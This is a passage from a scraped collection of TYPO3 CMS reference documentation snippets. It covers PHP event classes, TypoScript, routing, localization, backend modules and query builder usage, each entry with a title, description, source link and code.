php\nCODE:\n```\nBackendUtility::viewOnClick(\n    (int)$this->pageInfo['uid'],\n    '',\n    BackendUtility::BEgetRootLine((int)$this->pageInfo['uid'])\n);\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyTreeDataEvent Class in TYPO3 Core API\nDESCRIPTION: This snippet defines the ModifyTreeDataEvent class in the TYPO3\\CMS\\Core\\Tree\\Event namespace. It includes methods for getting and setting tree data, as well as retrieving the provider.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/ModifyTreeDataEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Tree\\Event;\n\nclass ModifyTreeDataEvent\n{\n    public function getTreeData(): \\TYPO3\\CMS\\Backend\\Tree\\TreeNode\n    {\n        // Implementation not shown\n    }\n\n    public function setTreeData(\\TYPO3\\CMS\\Backend\\Tree\\TreeNode $treeData): void\n    {\n        // Implementation not shown\n    }\n\n    public function getProvider(): \\TYPO3\\CMS\\Core\\Tree\\TableConfiguration\\AbstractTableConfigurationTreeDataProvider\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using the log() Method in TYPO3\nDESCRIPTION: Example of using the basic log() method in TYPO3, which takes a log level, message, and optional data array. This is the core method for logging in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Logger/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$this->logger->log($level, $message, $data);\n```\n\n----------------------------------------\n\nTITLE: Basic TypoScript TEXT Object Configuration\nDESCRIPTION: Shows how to configure a simple TEXT TypoScript object for rendering plain text.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/UsingTypoScriptCObjectViewHelper.rst#2025-04-16_snippet_1\n\nLANGUAGE: typoscript\nCODE:\n```\nlib.title = TEXT\nlib.title.value = Extbase and Fluid\n```\n\n----------------------------------------\n\nTITLE: Disabling TYPO3 Core Updater in Apache Configuration\nDESCRIPTION: Apache configuration that sets the environment variable to disable the TYPO3 Core Updater functionality. This should be added to the .htaccess file in the public directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/Legacy/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: apacheconf\nCODE:\n```\nSetEnv TYPO3_DISABLE_CORE_UPDATER 1\n```\n\n----------------------------------------\n\nTITLE: Setting Local Language for Fluid Template\nDESCRIPTION: Example of configuring localized strings for a Fluid template using _LOCAL_LANG within page configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/TypoScript.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\npage = PAGE\npage {\n    10 = FLUIDTEMPLATE\n    10 {\n        _LOCAL_LANG {\n            default.key = value\n            de.key = Wert\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Inserting Figure in TYPO3 Documentation\nDESCRIPTION: This RST directive inserts a figure showing the Backend Users module interface in the TYPO3 documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendUsers/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: rst\nCODE:\n```\n..  figure:: /Images/ManualScreenshots/UserManagement/Module/ModuleBackendUsers.png\n    :alt: Screenshots of the TYPO3 backend module Backend Users\n\n    This module makes it possible to search and filter users. They\n    can also be edited, deleted and disabled.\n```\n\n----------------------------------------\n\nTITLE: Resetting User Password via CLI in Legacy TYPO3 Installation\nDESCRIPTION: Command for administrators to reset a user's password in a legacy TYPO3 installation, requiring the backend URL and user's email address.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/AccessControl/PasswordReset/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 backend:resetpassword https://example.com/typo3/ editor@example.com\n```\n\n----------------------------------------\n\nTITLE: Using AfterCompiledCacheableDataForWorkspaceEvent in TYPO3\nDESCRIPTION: PSR-14 event handler for manipulating workspace version data after compilation. Used in the Web > Workspaces module to process cacheable data of workspace versions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Workspaces/AfterCompiledCacheableDataForWorkspaceEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Workspaces\\Event\\AfterCompiledCacheableDataForWorkspaceEvent\n```\n\n----------------------------------------\n\nTITLE: Extension Scanner Matcher Configuration in PHP\nDESCRIPTION: Configuration array that defines how the Extension Scanner matches deprecated method calls, including mandatory arguments and documentation references.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/UpdateExtensions/ExtensionScanner.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n'TYPO3\\CMS\\Core\\Utility\\SomeUtility::someMethod' => [\n    'numberOfMandatoryArguments' => 0,\n    'maximumNumberOfArguments' => 1,\n    'restFiles' => [\n        'Deprecation-12345-DeprecateSomeMethod.rst',\n    ],\n],\n```\n\n----------------------------------------\n\nTITLE: Using TYPO3's DocumentService as a jQuery.ready Substitute\nDESCRIPTION: A modern implementation using TYPO3's DocumentService module that returns a Promise which resolves when the DOM is ready, eliminating the jQuery dependency.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Modules/DocumentService.rst#2025-04-16_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport DocumentService from '@typo3/core/document-service.js';\n\nDocumentService.ready().then(() => {\n  // your application code\n});\n```\n\n----------------------------------------\n\nTITLE: Setting Layout Root Paths - TYPO3 PHP\nDESCRIPTION: This snippet sets the layout root paths for templated emails, specifying locations where the system will look for layout files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['layoutRootPaths'] = [\n    0 => 'EXT:core/Resources/Private/Layouts/',\n    10 => 'EXT:backend/Resources/Private/Layouts/',\n];\n```\n\n----------------------------------------\n\nTITLE: Configuring 'version' in TYPO3\nDESCRIPTION: This snippet showcases the configuration of the 'version' option, dictating the default HTTP protocol version used by TYPO3's HTTP client. It can be set to either \"1.0\" or \"1.1\".\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/HTTP.rst#2025-04-16_snippet_8\n\nLANGUAGE: PHP\nCODE:\n```\n\"$GLOBALS['TYPO3_CONF_VARS']['HTTP']['version']\"\n```\n\n----------------------------------------\n\nTITLE: PHP Debug Output Utility Usage\nDESCRIPTION: Details the use of the TYPO3 CMS Debug Utility functions for producing debug output, with a strong emphasis on removing these statements before code is committed.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_9\n\nLANGUAGE: php\nCODE:\n```\ndebug()\n\\TYPO3\\CMS\\Core\\Utility\\DebugUtility::debug()\n```\n\n----------------------------------------\n\nTITLE: Configuring Sudo Mode for TYPO3 Backend Routes\nDESCRIPTION: Example showing how to configure sudo mode for backend routes. Sudo mode requires an additional authentication step for sensitive backend modules.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendRouting.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n<?php\nreturn [\n    'my_critical_route' => [\n        'path' => '/my-critical-module',\n        'target' => \\Vendor\\MyExtension\\Controller\\MyCriticalController::class . '::indexAction',\n        'sudo' => true,\n    ],\n];\n\n```\n\n----------------------------------------\n\nTITLE: Cleaning Module Data Properties in TYPO3 Backend Controller\nDESCRIPTION: This snippet shows how to clean and restrict the values of module data properties using the clean() method of the ModuleData object in a TYPO3 backend controller.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleDataObject.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n$allowedValues = ['foo', 'bar'];\n$this->moduleData->clean('property', $allowedValues);\n```\n\n----------------------------------------\n\nTITLE: Referencing ModuleTemplate in PHP\nDESCRIPTION: This snippet shows the PHP namespace for the ModuleTemplate class in TYPO3 CMS. It's used to implement ViewInterface and provide button bar functionality for backend modules.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleTemplate.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Backend\\Template\\ModuleTemplate\n```\n\n----------------------------------------\n\nTITLE: Removing All Registry Entries by Namespace in TYPO3 CMS (PHP)\nDESCRIPTION: The removeAllByNamespace() method unsets all persistent entries for a given namespace. This is useful for cleaning up all entries related to a specific extension.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Registry/Registry.rst.txt#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nremoveAllByNamespace(?string $namespace)\n```\n\n----------------------------------------\n\nTITLE: Defining AfterFileRemovedFromIndexEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This snippet defines the AfterFileRemovedFromIndexEvent class in the TYPO3\\CMS\\Core\\Resource\\Event namespace. The class represents an event that is fired when a file is removed from the sys_file database table. It includes a method getFileUid() that returns the UID of the removed file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileRemovedFromIndexEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass AfterFileRemovedFromIndexEvent\n{\n    public function getFileUid(): int\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Selecting Specific Fields with TYPO3 Query Builder\nDESCRIPTION: Example showing how to select specific fields from a table using the Query Builder. Each field name is passed as a separate argument.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n// SELECT `uid`, `pid`, `aField`\n$queryBuilder->select('uid', 'pid', 'aField');\n```\n\n----------------------------------------\n\nTITLE: Default Upload Folder Configuration in TYPO3 TSconfig\nDESCRIPTION: Configuration to set a custom default upload folder for users or user groups using TSconfig. Specifies the storage ID and path for file uploads.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/Administration/Permissions.rst#2025-04-16_snippet_2\n\nLANGUAGE: typoscript\nCODE:\n```\noptions.defaultUploadFolder = 3:users/uploads/\n```\n\n----------------------------------------\n\nTITLE: Using BeforeStylesheetsRenderingEvent in TYPO3\nDESCRIPTION: Event class reference for BeforeStylesheetsRenderingEvent that is triggered before stylesheets are rendered by the AssetRenderer. The event provides access to the AssetCollector for modifying stylesheet assets.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Page/BeforeStylesheetsRenderingEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Page\\Event\\BeforeStylesheetsRenderingEvent\n```\n\n----------------------------------------\n\nTITLE: Validating Website URL in PHP\nDESCRIPTION: Example of using the URL validator to ensure a website field contains a valid web URL with a proper scheme.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Validation/Validators/Index.rst#2025-04-16_snippet_14\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Extbase\\Annotation\\Validate;\n\nclass UserProfile\n{\n    #[Validate(['validator' => 'Url'])]\n    protected string $website = '';\n}\n```\n\n----------------------------------------\n\nTITLE: Using Custom BitSet Class Example in TYPO3\nDESCRIPTION: Demonstrates how to use the custom Permissions BitSet class for managing access permissions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/BitSets/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\n$permissions = \\MyVendor\\MyExtension\\Bitmask\\Permissions::create();\n\n// Set some permissions\n$permissions->setRead();\n$permissions->setDelete();\n\n// Test permissions\n$permissions->canRead(); // true\n$permissions->canWrite(); // false\n$permissions->canDelete(); // true\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeFlexFormDataStructureIdentifierInitializedEvent Class in PHP\nDESCRIPTION: This class allows listeners to specify the data structure identifier for a given TCA flex field. It provides methods to get field TCA, table name, field name, and row data, as well as methods to set and get the identifier.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeFlexFormDataStructureIdentifierInitializedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nphp:class:: BeforeFlexFormDataStructureIdentifierInitializedEvent\n\n    Listeners to this event are able to specify the data structure identifier,\n    used for a given TCA flex field.\n\n    Listeners should call ->setIdentifier() to set the identifier or ignore the\n    event to allow other listeners to set it. Do not set an empty string as this\n    will immediately stop event propagation!\n\n    The identifier SHOULD include the keys specified in the Identifier definition\n    on FlexFormTools, and nothing else. Adding other keys may or may not work,\n    depending on other code that is enabled, and they are not guaranteed nor\n    covered by BC guarantees.\n\n    Warning: If adding source record details like the uid or pid here, this may turn out to be fragile.\n    Be sure to test scenarios like workspaces and data handler copy/move well, additionally, this may\n    break in between different core versions.\n    It is probably a good idea to return at least something like [ 'type' => 'myExtension', ... ], see\n    the core internal 'tca' and 'record' return values below\n\n    See the note on FlexFormTools regarding the schema of $dataStructure.\n```\n\n----------------------------------------\n\nTITLE: Multi-site Project Organized Backend Groups Structure\nDESCRIPTION: PlantUML diagram showing the complete organized structure of backend user groups for a multi-site TYPO3 project.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/PermissionsManagement/ExampleConfiguration/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: plantuml\nCODE:\n```\n..  uml:: _backend-groups-multisite-project-organized.plantuml\n```\n\n----------------------------------------\n\nTITLE: Middleware Process Implementation\nDESCRIPTION: Demonstrates the process method implementation in a middleware using request handling for localization.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Php.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\npublic function process(ServerRequestInterface $request, RequestHandlerInterface $handler): ResponseInterface\n{\n    $jsonResponse = ['seasons' => $this->getSeasons($request)];\n    $body = $this->streamFactory->createStream(json_encode($jsonResponse));\n    return $this->responseFactory\n        ->createResponse()\n        ->withHeader('Content-Type', 'application/json; charset=utf-8')\n        ->withBody($body);\n```\n\n----------------------------------------\n\nTITLE: Utilizing TypoScript in TYPO3\nDESCRIPTION: This TypoScript snippet demonstrates basic operations within a TYPO3 CMS environment, using the operator to copy existing configurations for reuse. The snippet defines simple text configurations and reuses one configuration by copying. TYPO3 setup prerequisites apply, and the primary dependency is having a TYPO3 CMS environment configured with TypoScript.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/OperatorCopy2.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nmyIdentifier {\n   10 = TEXT\n   10.value = Hello world\n   20 < myIdentifier.10\n}\n```\n\n----------------------------------------\n\nTITLE: CSS Asset Reference Update\nDESCRIPTION: Examples of updating CSS asset references to use relative paths instead of absolute paths to extension resources\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/AssetMigration.rst#2025-04-16_snippet_0\n\nLANGUAGE: css\nCODE:\n```\nbackground-image: url('../Images/logo.jpg')\n```\n\nLANGUAGE: css\nCODE:\n```\nbackground-image: url('/_assets/9e592a1e5eec5752a1be78133e5e1a60/Images/logo.jpg')\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyLanguagePacksEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This snippet defines the ModifyLanguagePacksEvent class in the TYPO3\\CMS\\Install\\Service\\Event namespace. It includes methods for retrieving extensions, removing an extension, and removing a specific ISO code from an extension's language packs.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Install/ModifyLanguagePacksEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Install\\Service\\Event;\n\nclass ModifyLanguagePacksEvent\n{\n    public function getExtensions(): array\n    {\n        // Implementation not shown\n    }\n\n    public function removeExtension(string $extension): void\n    {\n        // Implementation not shown\n    }\n\n    public function removeIsoFromExtension(string $iso, string $extension): void\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Static Utility Localization\nDESCRIPTION: Shows how to implement localization in a static utility context where normal context is not available.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Php.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\npublic static function process(): string\n{\n    $languageService = GeneralUtility::makeInstance(LanguageServiceFactory::class)\n        ->createFromUserPreferences($GLOBALS['BE_USER'] ?? null);\n    return $languageService->sL('LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:mystring');\n}\n```\n\n----------------------------------------\n\nTITLE: ModifyIconForResourcePropertiesEvent Class Method Declarations - PHP\nDESCRIPTION: Class methods for handling resource icon modifications in TYPO3 CMS. Includes getters and setters for resource properties, icon size, options, icon identifier, and overlay identifier.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/ModifyIconForResourcePropertiesEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\npublic function getResource(): \\TYPO3\\CMS\\Core\\Resource\\ResourceInterface;\n```\n\nLANGUAGE: php\nCODE:\n```\npublic function getIconSize(): \\TYPO3\\CMS\\Core\\Imaging\\IconSize;\n```\n\nLANGUAGE: php\nCODE:\n```\npublic function getOptions(): array;\n```\n\nLANGUAGE: php\nCODE:\n```\npublic function getIconIdentifier(): ?string;\n```\n\nLANGUAGE: php\nCODE:\n```\npublic function setIconIdentifier(?string $iconIdentifier);\n```\n\nLANGUAGE: php\nCODE:\n```\npublic function getOverlayIdentifier(): ?string;\n```\n\nLANGUAGE: php\nCODE:\n```\npublic function setOverlayIdentifier(?string $overlayIdentifier);\n```\n\n----------------------------------------\n\nTITLE: Initializing GravatarViewHelper with Optional Support (PHP)\nDESCRIPTION: Example of initializing a GravatarViewHelper with optional support for both TYPO3 v12.4 and v13, showing how to conditionally use registerTagAttribute.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/DevelopCustomViewhelper.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\n..  literalinclude:: _CustomViewHelper/_GravatarViewHelper_Initialize.diff\n    :caption: EXT:my_extension/Classes/ViewHelpers/GravatarViewHelper.php\n```\n\n----------------------------------------\n\nTITLE: Modifying Content Element in Wizard using TSConfig\nDESCRIPTION: Illustrates how to change the title, description, icon, and default values of a content element in the New Content Element wizard using Page TSconfig.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/ContentElementsWizard.rst#2025-04-16_snippet_4\n\nLANGUAGE: TSConfig\nCODE:\n```\nmod.wizards.newContentElement.wizardItems.special {\n    elements {\n        uploads {\n            iconIdentifier = content-special-uploads\n            title = LLL:EXT:my_sitepackage/Resources/Private/Language/locallang.xlf:content_element.uploads.title\n            description = LLL:EXT:my_sitepackage/Resources/Private/Language/locallang.xlf:content_element.uploads.description\n            tt_content_defValues {\n                header = My default header\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing the Core Link Handler Interface in TYPO3 CMS\nDESCRIPTION: Shows the PHP namespace and interface for the Core link handler in TYPO3 CMS. This interface is implemented to match between different internal representations of a link.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LinkHandling/CoreLinkHandler.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\LinkHandling\\LinkHandlingInterface\n```\n\n----------------------------------------\n\nTITLE: Displaying Configuration Presets Image with RST\nDESCRIPTION: RST markup for displaying a screenshot of the Configuration Presets card in TYPO3 CMS interface, including alt text and styling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/DebugSettings/ConfigurationPresets.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/DebugSettings/ConfigurationPresets.png\n   :alt: Configuration Presets Card\n   :class: with-shadow\n\n   Choose a configuration preset\n```\n\n----------------------------------------\n\nTITLE: Using Imports in TYPO3 CMS Routing Configuration\nDESCRIPTION: This YAML configuration demonstrates the use of imports to manage routing configurations more easily.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/Examples.rst#2025-04-16_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nimports:\n  - { resource: \"EXT:my_extension/Configuration/Routes/Blog.yaml\" }\n  - { resource: \"EXT:my_extension/Configuration/Routes/Api.yaml\" }\n\nrouteEnhancers:\n  PageTypeSuffix:\n    type: PageType\n    default: ''\n    index: 'index'\n    map:\n      'rss.xml': 225\n```\n\n----------------------------------------\n\nTITLE: Injecting Dependencies in BeforeRecordIsAnalyzedEvent Listener\nDESCRIPTION: This PHP code demonstrates how to inject the BrokenLinkRepository and SoftReferenceParserFactory dependencies into the event listener class using constructor injection.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Linkvalidator/BeforeRecordIsAnalyzedEvent.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\npublic function __construct(\n    private readonly BrokenLinkRepository $brokenLinkRepository,\n    private readonly SoftReferenceParserFactory $softReferenceParserFactory,\n) {}\n```\n\n----------------------------------------\n\nTITLE: Retrieving All TYPO3 Sites\nDESCRIPTION: Method to return a list of all configured sites in the TYPO3 installation. Accepts an optional cache parameter to control result caching.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Core/SiteFinder.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\ngetAllSites(bool $useCache = true): \\Site[]\n```\n\n----------------------------------------\n\nTITLE: Extending Site Configuration Form Fields\nDESCRIPTION: PHP code demonstrating how to add custom fields to the TYPO3 site configuration form interface through configuration overrides.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/ExtendingSiteConfig.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\n$GLOBALS['SiteConfiguration']['site']['columns']['myNewField'] = [\n    'label' => 'My new field',\n    'config' => [\n        'type' => 'input',\n        'eval' => 'trim',\n    ],\n];\n$GLOBALS['SiteConfiguration']['site']['types']['0']['showitem'] .= ',myNewField';\n```\n\n----------------------------------------\n\nTITLE: Using BeforeStdWrapFunctionsInitializedEvent PHP Class Reference\nDESCRIPTION: PHP class import statement showing the fully qualified namespace for the BeforeStdWrapFunctionsInitializedEvent class used in TYPO3's frontend content object processing.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/BeforeStdWrapFunctionsInitializedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Frontend\\ContentObject\\Event\\BeforeStdWrapFunctionsInitializedEvent\n```\n\n----------------------------------------\n\nTITLE: Creating RST Reference Label for Backend User Groups Submodule\nDESCRIPTION: This RST directive creates a reference label for the Backend User Groups submodule section in the TYPO3 documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendUsers/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: rst\nCODE:\n```\n..  _user-management-backend-user-groups:\n```\n\n----------------------------------------\n\nTITLE: File Command Structure Example in TYPO3 CMS\nDESCRIPTION: Example structure of a file command array showing an upload operation with target folder and data parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/AfterFileCommandProcessedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n'upload' => [\n    'target' => '1:/some/folder/'\n    'data' => '1'\n]\n```\n\n----------------------------------------\n\nTITLE: Creating LENGTH Expression Method in TYPO3 ExpressionBuilder\nDESCRIPTION: Method definition for creating a LENGTH expression in database queries. Takes a field name and optional alias parameter to generate a LENGTH expression for use in database queries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ExpressionBuilder/_ExpressionBuilderLength.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\npublic function length(string $fieldName, ?string $alias = NULL): string\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 Restriction Classes in PHP\nDESCRIPTION: The namespace for the RestrictionBuilder classes that add TYPO3-specific conditions to queries based on TCA settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ClassOverview/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: PHP\nCODE:\n```\nTYPO3\\CMS\\Core\\Database\\Query\\Restriction\\...\n```\n\n----------------------------------------\n\nTITLE: Implementing hasAction Method in PHP\nDESCRIPTION: This method checks if a specific action exists in a given group or in both groups if no group is specified.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyRecordListRecordActionsEvent.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\npublic function hasAction(string $actionName, string $group = ''): bool\n{\n    // Method implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Route Alias Identifiers in TYPO3 Backend\nDESCRIPTION: Example of setting up route alias identifiers for a TYPO3 backend module, enabling backwards compatibility with older module identifiers.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleConfiguration/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nreturn [\n    'my_module' => [\n        'parent' => 'web',\n        'aliases' => ['web_txmyextension_mymodule'],\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Accessing ModuleInterface in TYPO3 Backend\nDESCRIPTION: This snippet demonstrates how to access and use the ModuleInterface in TYPO3 CMS backend. It shows the namespace and class name for the ModuleInterface and ModuleProvider.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleInterface.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Backend\\Module\\ModuleProvider\n```\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Backend\\Module\\ModuleInterface\n```\n\n----------------------------------------\n\nTITLE: Removing Multiple Cache Tags in TYPO3 CMS (PHP)\nDESCRIPTION: This code shows how to remove multiple cache tags from the frontend cache collector in a single operation. It retrieves the cache collector from the request attributes and removes two specified cache tags.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/FrontendCacheCollector.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n// use 